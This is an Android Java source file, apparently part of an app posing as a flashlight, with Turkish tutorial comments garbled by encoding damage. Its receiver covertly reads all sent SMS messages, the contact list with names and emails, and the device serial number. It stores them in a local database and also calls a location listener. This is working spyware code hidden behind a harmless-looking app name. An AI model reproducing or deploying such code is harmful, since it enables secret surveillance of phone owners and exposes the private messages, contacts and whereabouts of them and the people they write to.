package com.example.flashlightexample;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import com.example.flashlightexample.RehberOkuma.rehberOkuma;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

public class GidenSmsDinleme extends BroadcastReceiver {
	// arkada�lar burada farkl� bir yol izleyece�iz normalde broadcast
	// ihtiyac�m�z yok brada ben ��yle bir mant�k kullandm
	// �imdi giden smsleri broadcast ile dinleyemiyoruz o y�zden direk telfon
	// sms klas�r�ne eri�ip oradan giden smsleri �ekice�iz peki neden burada
	// neden broadcast kulland�k ��nk� giden sms klas�rnden smsleri neye g�re
	// cekece�iz ? �le de�ilmi ben burada her sms geldi�inde biraz �nce
	// yapm��t�k
	// gelen smsleri dinlemeyi ) giden smsleri al�yorum.
	static Map<String, String>rehber=new HashMap<String, String>();
	String phoneNumber;

	static int giris = 0;
	private ContentValues val;
	private SQLiteDatabase dbGidenSms;
	private SQLiteDataBaseHelperGidenSms dbHelperGidenSms;
	KonumDinliyorum knm = new KonumDinliyorum();
	MainActivity rbOkm=new MainActivity();
	String gideckNo;
	String gelnIsim;
	Context mContext;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		// �imdi �ncelikle burada �unu yapal�m her sms geldi�inde gden sms
		// klas�r�n� almas�n� bizim i�in yok y�k ve sa�mal�k olur bu y�zden her
		// sms
		// geldi�inde �nce giden sms db sini silsin ve sildi�inin yerine yazsn
		// b�ylece ayn� mesajlar� tekrar tekrar yazmam�� olur ama burda ��yle
		// bir sorun
		// olacak ilk giri�te sql bo� oldu�ndan silmeye �al��cak b�yle uygulama
		// patlar bu y�zden tryCacth kodk
		Log.i("zma","zma 1");
		this.mContext=context;
			rehberOkumaAtama();
		Log.i("zma","zma 2");

		try {
			String sqlGidenSms = "DELETE FROM"
					+ SQLiteDataBaseHelperGidenSms.TABLE_NEWS;
			dbGidenSms.execSQL(sqlGidenSms);
			// log koyal�k �al��t�m� die
			Log.i("zms giden sms trycatch ", "zms");

		} catch (Exception e) {
			// TODO: handle exception
		}
		// sms geldi�ini anlamak i�in
				
			Cursor cursor2 = context.getContentResolver().query(
					Uri.parse("content://sms/sent"), null, null, null, null);
			cursor2.moveToFirst();
			String GonderilenNo = "";
			do {//burada do-while i�ine koydum ki her numara i�in ayr� ayr� yapsn
				try {
				String strG=new String(cursor2.getString(2));
				String ifgideckNo=strG.substring(0, 2);
					 	if(ifgideckNo.equals("+9"))	{		
			
					String str=new String(cursor2.getString(2));
					
					 gideckNo=str.substring(2, 13);
				
			
				
				 gelnIsim=rehber.get(gideckNo);
					 	}else{
					 		gideckNo=cursor2.getString(2);
					 		
							 gelnIsim=rehber.get(gideckNo);
					 	} 
				
				GonderilenNo += " " + cursor2.getColumnName(2) + ":"
						+ cursor2.getString(2)+"\n Gonderilen Num.Rehberdeki Ismi: "+gelnIsim +"\n" + "Mesaj ��eri�i: \n"// ayn� �ekilde database ye yaz�lmas� i�in ekliyoruz..
						+ " " + cursor2.getColumnName(13) + ":"
						+ cursor2.getString(13) + "\n"
						+ "Ne zaman G�nderildi:\n" + " ";
				String GonderilenZamn = cursor2.getString(5);
				long messageZamn = Long.parseLong(GonderilenZamn.substring(0,
						10));
				String date = new java.text.SimpleDateFormat(
						"dd/MM/yyyy HH:mm:ss").format(new java.util.Date(
						messageZamn * 1000));
				GonderilenNo += cursor2.getColumnName(5) + ":" + date + "\n"
						+ "Hangi Simden G�nderildi: \n" + " "
						+ cursor2.getColumnName(16) + ":"
						+ cursor2.getString(16) + "\n\n";
				} catch (Exception e) {
					// TODO: handle exception
				}
			} while (cursor2.moveToNext());// Sone gelene kadar ileri gitmesi
											// i�in

			// �imdi di�erlerinde yaptmz gibi zaman� ve cihaz id sini alal�m
			// Arama Geldi�inde (sayfan�n tetiklendi�i zamn)
			String currenDateTime = DateFormat.getDateInstance().format(
					new Date());
			// Android Cihaz �d si okuma
			String serialnum = null;

			try {
				Class<?> c;
				c = Class.forName("android.os.SystemProperties");
				Method get = c.getMethod("get", String.class, String.class);
				serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (NoSuchMethodException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			// Sql db ye yazal�m
			dbHelperGidenSms = SQLiteDataBaseHelperGidenSms
					.getInstance(context);
			dbGidenSms = dbHelperGidenSms.getWritableDatabase();
			val = new ContentValues();
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_DATETIME,
					currenDateTime);
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_ACTION, "Giden Sms");
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_CONTENT, GonderilenNo);
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_SERIALNUMBER, serialnum);
			dbGidenSms.insert(SQLiteDataBaseHelperGidenSms.TABLE_NEWS, null,
					val);
			// Burada ki�inin konumunu al�yoruz.
			knm.onReceive(context, intent);

			// Giden Smsleri dinlemede bukadar
		

	}
	private void rehberOkumaAtama() {
		 Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
	        String _ID = ContactsContract.Contacts._ID;
	        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
	        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

	        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
	        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
	        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

	        Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
	        String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
	        String DATA = ContactsContract.CommonDataKinds.Email.DATA;
	

	StringBuffer	output = new StringBuffer();
		//buras� rehber okuma
	Log.i("zma","zma rehO 1");

				ContentResolver contentResolver =mContext.getContentResolver();
				Log.i("zma"," zma rehO 2");

				Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);
				Log.i("zma","zma rehO3");


				// Loop for every contact in the phone
				if (cursor.getCount() > 0) {

					while (cursor.moveToNext()) {

						String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
						String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));//Rehberdeki kay�tl� isim...

						int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));

						if (hasPhoneNumber > 0) {					

							// Query and loop for every phone number of the contact
							Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);

							while (phoneCursor.moveToNext()) {//burda her numara i�in ayr� ayr� yapt�k
								//burada phoneNumber yani rehberdeki numara bilgisi..... 
								//arkada�lar burada rehber.put diyerek hashMap �m�za key-value �eklinde verimizi eklemi� oldukk.....
								phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
								//�imdi arkada�lar burada ��yle bir�ey yapt�m sms dinleme class'�m�zdan gelecek numaralar +90...ile ba�layacak
								//bizim rehberimizde numaralar belkide normal 0505... die ba�layabilr o y�zden sorun olmamas� i�in kesme yapt�m
								try {
								String strG=new String(phoneNumber);
								String ifgideckNo=strG.substring(0,2);//gelen numaran�n  yani rehberden okudumuz no nun ilk 2 karakteri +9 ise ded,m
								//+9 la ba�layan k�sm� kes 0505... olarak kals�n...
								 	if(ifgideckNo.equals("+9"))	{	// eyer +9 ise			
									
										String str=new String(phoneNumber);
										 gideckNo=str.substring(2, 13);//kesilen ve 05050000000 olarak kalan 11 haneli numaram�z...
									
								 	
									Log.i("zms","zms keskNo:"+gideckNo);
									output.append("Phone number:" + phoneNumber);
			 						output.append("\n First Name:" + name);
			 						output.append("\n"+"-------------------------");
			 						rehber.put(gideckNo, name); 	

								 	}else{// Burada else dememizin amac� belirttim gibi eyer rehberde numaralar +9 ile ba�lm�yorsa... onlar normal kals�n die.
								 		output.append("\nPhone number:" + phoneNumber);
				 						output.append("\n First Name:" + name);
				 						output.append("\n"+"-------------------------");
								 		rehber.put(phoneNumber, name);
								 		
										
								 		
								 	}
								} catch (Exception e) {
									// TODO: handle exception
								}
							}

							phoneCursor.close();

							// Query and loop for every email of the contact
							Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);

							while (emailCursor.moveToNext()) {

							String	email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
		//burada da isterseniz eyer numaraya ait e-mail adresi eklenmi�se ona ula�abilirsiniz...
								output.append("\nEmail:" + email);

							}

							emailCursor.close();
						}
						 output.append("\n");

					
					}
					
					
						}
	}
}
